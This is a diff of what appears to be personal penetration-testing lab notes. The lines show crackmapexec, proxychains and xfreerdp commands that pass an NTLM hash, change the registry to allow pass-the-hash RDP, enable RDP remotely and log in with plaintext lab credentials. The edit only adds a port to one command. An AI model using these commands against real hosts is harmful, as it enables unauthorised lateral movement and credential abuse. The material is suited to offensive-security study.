@@ -135,7 +135,7 @@ rdp(sometimes authentication not correct):
 (To enable passing the hash in xfreerdp, cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f')
 proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
 proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE'(Admin privilege can turn on rdp on machine)
-proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82 /cert-ignore
+proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com(if this user is localuser,do not specify domain!!!!!) /p:Mushroom! /v:172.16.218.82:port /cert-ignore
 
 smb(-x requires admin privilege):
 for impacket-psexec.py to have shell by smb, Admin$ or C$ need to be writable
